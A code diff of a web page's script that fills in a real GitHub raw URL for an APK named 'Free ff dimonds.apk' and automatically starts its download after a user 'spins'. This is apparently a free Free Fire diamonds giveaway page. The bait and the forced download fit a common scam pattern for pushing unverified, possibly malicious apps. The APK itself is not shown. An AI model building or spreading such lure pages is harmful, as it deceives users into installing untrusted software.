@@ -127,8 +127,9 @@
     </div>
 
     <script>
-        // GitHub raw URL for the APK file (replace with your actual GitHub raw URL)
-        const apkUrl = "https://raw.githubusercontent.com/yourusername/yourrepo/main/yourfile.apk"; // Update this with your GitHub raw URL
+        // GitHub raw URL for the APK file (updated based on your GitHub repo)
+        // Assuming the APK file is named "Free ff dimonds.apk" in your repo's main branch
+        const apkUrl = "https://raw.githubusercontent.com/ducky38994/Free-FF-Dimonds/main/Free ff dimonds.apk";
 
         // Check if user has already spun (using localStorage)
         if (localStorage.getItem('hasSpun')) {
@@ -151,7 +152,7 @@
             // Download the APK from GitHub
             const link = document.createElement('a');
             link.href = apkUrl;
-            link.download = "FreeFireDiamonds.apk"; // Suggested download name
+            link.download = "Free ff dimonds.apk"; // Suggested download name
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
